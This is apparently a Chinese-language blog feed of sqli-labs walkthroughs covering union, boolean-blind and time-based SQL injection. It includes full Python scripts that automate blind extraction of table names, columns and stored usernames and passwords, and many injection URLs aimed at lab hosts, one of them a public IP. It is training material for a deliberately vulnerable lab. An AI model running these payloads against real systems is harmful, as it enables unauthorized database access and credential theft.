  # 获取数据库中的表    for i in xrange(0, tableCount):        # 第几个表        num = str(i)        # 获取当前这个表的长度        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)        print &quot;current table length:&quot; + str(tableNameLength)        # 获取当前这个表的名字        selectTableName = selectTable % (DBname, i)        tableName = getName(asciiPayload, selectTableName, tableNameLength)        print tableName    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;    # print selectColumnCountPayload    # 获取指定表的列的数量    columnCount = getLengthOfString(selectColumnCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)    # 获取该表有多少行数据    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;    dataCount = getLengthOfString(dataCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)    data = []    # 获取指定表中的列    for i in xrange(0, columnCount):        # 获取该列名字长度        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(            i) + &quot;,1)&gt;=%d #&quot;        # print selectColumnNameLengthPayload        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)        print &quot;current column length:&quot; + str(columnNameLength)        # 获取该列的名字        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;        selectColumnName = selectColumn % (getTable, i)        # print selectColumnName        columnName = getName(asciiPayload, selectColumnName, columnNameLength)        print columnName        tmpData = []        tmpData.append(columnName)        # 获取该表的数据        for j in xrange(0, dataCount):            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;            # print columnDataLengthPayload            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)            # print columnDataLength            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;            columnData = getName(asciiPayload, selectData, columnDataLength)            # print columnData            tmpData.append(columnData)        data.append(tmpData)        # print data    # 格式化输出数据    # 输出列名    tmp = &quot;&quot;    for i in xrange(0, len(data)):        tmp += data[i][0] + &quot;   &quot;    print tmp    # 输出具体数据    for j in xrange(1, dataCount + 1):        tmp = &quot;&quot;        for i in xrange(0, len(data)):            tmp += data[i][j] + &quot;   &quot;        print tmpif __name__ == &quot;__main__&quot;:    print &quot;-----------inject starting----------&quot;    inject()</code></pre><p>与less5相似</p><h3 id="less-9：GET-基于时间类型-盲注"><a href="#less-9：GET-基于时间类型-盲注" class="headerlink" title="less-9：GET-基于时间类型-盲注"></a>less-9：GET-基于时间类型-盲注</h3><p>基于时间的盲注，只用修改一下上面的python脚本即可实现，加个时间判断，payload：<br><a href="http://127.0.0.1/sql/Less-9/?id=1" target="_blank" rel="external">http://127.0.0.1/sql/Less-9/?id=1</a>‘ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(2)) %23<br>这里if判断为真，所以会执行sleep(2)，查询操作会有明显的延迟。如果为假，即不正确，那么就不会执行sleep(2)，页面回显会明显的很快。<br>在了解了这些基本知识之后，我们使用一下payload来sql注入<br><a href="http://192.168.1.158/sqli-labs/Less-8/?id=1‘" target="_blank" rel="external">http://192.168.1.158/sqli-labs/Less-8/?id=1‘</a> and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第10关只要把前面两关payload部分的单引号改成双引号即可。<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="external">http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs5-6(盲注)</title>
      <link href="/archives/4303333d/"/>
      <url>/archives/4303333d/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[TOC]</p><p>盲注分为以下三类：</p><p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p><h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p><p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171016_51.png" alt=""></p><pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><p>near ‘’1’’ LIMIT 0,1’ at line 1</p><p>分离最外层的单引号：</p><p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p><p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p><p>select * from talbe where id = ‘input’ </p><h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p><h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p><pre><code>import requestsimport stringdataset = &quot; abcdefghijklmnopqrstuvwxyz_&quot;def sendPayload(payload):    url = &quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+ payload    content = requests.get(url).text    return contentdef get_db_length():    count = 1    while count:        payload = &quot;and length(database())=&quot;        payload = payload + str(count) + &quot;%23&quot;        recv = sendPayload(payload)        if &quot;You are in&quot; in recv:            return count        else:            count += 1def getdbName(length):    result=&quot;&quot;    for k in range(length+1):            for j in dataset:                    payload=&quot;and left(database(),&quot;+str(k)+&quot;)=&#39;&quot;+result+j+&quot;&#39;%23&quot;                    recv=sendPayload(payload)                    if &quot;You are in&quot; in recv:                        if j !=&#39; &#39;:                            result+=j                            print result                        breakdef main():    length = get_db_length()     print &quot;the length of database is &quot;,length     getdbName(length)if __name__==&quot;__main__&quot;:    main()</code></pre><p>这里跑出来以后数据库名字是security。<br>方法二手注left：<br><a href="http://43.247.91.228:84/Less-5/?id=1‘" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1‘</a> and (left(database(),1)=’s’)–+<br>left(database(),1)=’s’表示数据库名从左往右取一个字符，判断该字符是否等于s<br>left(database(),2)=’se’表示数据库名从左往右取两个个字符，判断该字符是否等于se</p><p>方法三：使用ascii()函数和substr()函数进行夹逼 </p><blockquote><p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p></blockquote><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p><p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p><h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p><p>方法二：</p><p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p><pre><code>#!/usr/bin/env python#coding=utf-8import requestsimport stringdef get_data(payload):    url=&quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+payload    content=requests.get(url).text    return contentdef get_table_length(i):    for j in range(0,20):        payload=&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1)=&quot;+str(j)+&quot;%23&quot;        #print payload        recv=get_data(payload)        if &quot;You are in&quot; in recv:            #print j            return jdef get_TableName():    for i in range(0,20):        result=&quot;&quot;        table_length=get_table_length(i)        if table_length is None:            break        #print table_length        for j in range(table_length+1):            for k in range(48,122):                payload=&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1),&quot;+str(j)+&quot;,1))=&quot;+str(k)+&quot;%23&quot;                recv=get_data(payload)                if &quot;You are in&quot; in recv:                    result+=chr(k)                    print result                    breakdef main():    get_TableName()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171315_415.png" alt=""></p><h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p><h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p><h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requestsurl = &#39;http://192.168.1.158/sqlilabs/Less-5/?id=1&#39;db_length = 0db_name = &#39;&#39;table_num = 0table_len = 0table_name = &#39;&#39;table_list = []column_num = 0column_len = 0column_name = &#39;&#39;column_list = []dump_num = 0dump_len = 0dump_name = &#39;&#39;dump_list = []i = j = k = 0### 当前数据库名长度 ###for i in range(1,20):    db_payload = &#39;&#39;&#39;&#39; and (length(database())=%d)--+&#39;&#39;&#39; %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if &quot;You are in&quot; in r.text:        db_length = i        print(&#39;当前数据库名长度为：%d&#39; % db_length)        break### 当前数据库名 ###print(&#39;开始猜解数据库名......&#39;)for i in range(1,db_length+1):    for j in range(95,123):        db_payload = &#39;&#39;&#39;&#39; and (left(database(),%d)=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            db_name += chr(j)            # print(db_name)            breakprint(&#39;数据库名：\n[+]&#39;,db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = &#39;&#39;&#39;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if &quot;You are in&quot; in r.text:        table_num = i        breakprint(&#39;一共有%d张表&#39; % table_num)print(&#39;开始猜解表名......&#39;)### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = &#39;&#39;    #### 表名长度 ####    for j in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if &quot;You are in&quot; not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if &quot;You are in&quot; in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint(&#39;表名：&#39;,table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(column_name) from information_schema.columns where table_name=&#39;%s&#39;)--+&#39;&#39;&#39; % (        j, i)        r = requests.get(url + db_payload)        if &quot;You are in&quot; in r.text:            column_num = j            print((&quot;[+] 表名：%-10s\t&quot; % i) + str(column_num) + &#39;字段&#39;)            break#### 猜解列名长度 ####column_num = 3print(&#39;%s表中的列名：&#39; % table_list[-1])for j in range(3):    column_name = &#39;&#39;    for k in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if &quot;You are in&quot; not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&quot;%s&quot; limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if &quot;You are in&quot; in r.text:                column_name += chr(l)    print(&#39;[+] &#39;,column_name)    column_list.append(column_name)print(&#39;开始爆破以下字段：&#39;,column_list[1:])for column in column_list[1:]:    print(column,&#39;：&#39;)    dump_num = 0    for i in range(30):        db_payload = &#39;&#39;&#39;&#39; and %d=(select count(%s) from %s.%s)--+&#39;&#39;&#39; % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = &#39;&#39;        #### 字段长度 ####        for j in range(1, 21):            db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if &quot;You are in&quot; not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+&#39;&#39;&#39; % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if &quot;You are in&quot; in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print(&#39;[+]&#39;,dump_name)</code></pre><p>##less-6：GET-基于错误-双引号-复杂注入语句<br><a href="http://43.247.91.228:84/Less-6/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-6/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803172047_337.png" alt=""><br>your MySQL server version for the right syntax to use near ‘“1\” LIMIT 0,1’ at line 1<br> near ‘     “    1\    “ LIMIT 0,1    ‘ at line 1<br> 猜测后台语句：<br> select * from talbe where id = “input”<br>把less5代码中payload部分的’(单引号)改成”(双引号)即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sqli-labs  1-4</title>
      <link href="/archives/239c6225/"/>
      <url>/archives/239c6225/</url>
      
        <content type="html"><![CDATA[<h1 id="Sqli-labs-1-4"><a href="#Sqli-labs-1-4" class="headerlink" title="Sqli-labs  1-4"></a>Sqli-labs  1-4</h1><p>[TOC]</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><p>##安装<br>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170021_645.png" alt=""></p><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1</p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1</p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 3–+<br><a href="http://43.247.91.228:84/Less-1/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=1</a>‘  order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170024_632.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170025_607.png" alt=""></p><blockquote><p>使用union语句查询时，必须使前面的语句查询出错(例如id=-1，而id中并没有为-1的)，以为当查询出错时，sql语句结果为空，也就会显示我们构造的sql语句所查询的内容，即union之后语句的执行结果。</p></blockquote><p>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘  UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170027_645.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170038_567.png" alt=""></p><p>6.暴列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(column_name) from information_schema.<strong>columns</strong> where <strong>table_name</strong>=’users’–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170039_473.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-1/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-1/?id=-1</a>‘ union select 1,2,group_concat(username,’:’,password) from security.users–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170043_887.png" alt=""></p><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a>‘<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170056_779.png" alt=""><br>在 id = 1后面添加’: 报语法错误</p><pre><code> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><p>先分离最外层单引号：</p><pre><code>near &#39;     &#39; LIMIT 0,1     &#39; at line 1</code></pre><p>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：</p><pre><code>select username,password from table where id = input</code></pre><p>2.确定字段个数<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=1</a> order by 4–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170100_90.png" alt=""><br>3.判断回显位(2,3处为显示位)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,3–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170101_674.png" alt=""><br>4.爆数据库名字、连接账号信息<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,version(),database()–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170103_26.png" alt=""><br>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803170105_974.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170107_284.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-2/?id=-1</a> UNION SELECT 1,2,group_concat(username,’:’,password) from security.users<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170110_138.png" alt=""></p><h2 id="less-3-GET-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET -基于错误的GET单引号变形字符型注入"></a>less 3 GET -基于错误的GET单引号变形字符型注入</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-3/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170121_987.png" alt=""></p><pre><code>MySQL server version for the right syntax to use near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><pre><code>near &#39;&#39;1\&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>现将外层单引号去掉</p><pre><code>near &#39;              &#39;  1\  &#39;) LIMIT 0,1           &#39; at line 1</code></pre><p> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )</p><p>所以修改sql语句：</p><p>select username，password from table where id = (‘input’)</p><p>所以再用这样的代码来进行注入：</p><pre><code>?id=1′) –-+</code></pre><p>1’) and (‘1’=’1<br>放入sql语句中：</p><p>select username，password from table where id = (‘  1’) and (‘1’=’1  ‘)</p><p>2.确定字段个数</p><p>3.判断回显位(2,3处为显示位)</p><p>4.爆数据库名字、连接账号信息</p><p>5.爆表名(数据库security下的所有表名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_646.png" alt=""><br>6.爆列名(表users下的所有列名)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users”–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803170130_127.png" alt=""><br>7.爆出字段值(security.users下所有的账号密码)<br><a href="http://43.247.91.228:84/Less-3/?id=-1" target="_blank" rel="external">http://43.247.91.228:84/Less-3/?id=-1</a>‘) union select 1,2,group_concat(username,’:’,password) from security.users–+</p><h2 id="less-4：GET-基于错误-双引号-字符型"><a href="#less-4：GET-基于错误-双引号-字符型" class="headerlink" title="less-4：GET-基于错误-双引号-字符型"></a>less-4：GET-基于错误-双引号-字符型</h2><p>1.试探<br><a href="http://43.247.91.228:84/Less-4/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-4/?id=1\</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803170137_745.png" alt=""><br> MySQL server version for the right syntax to use near 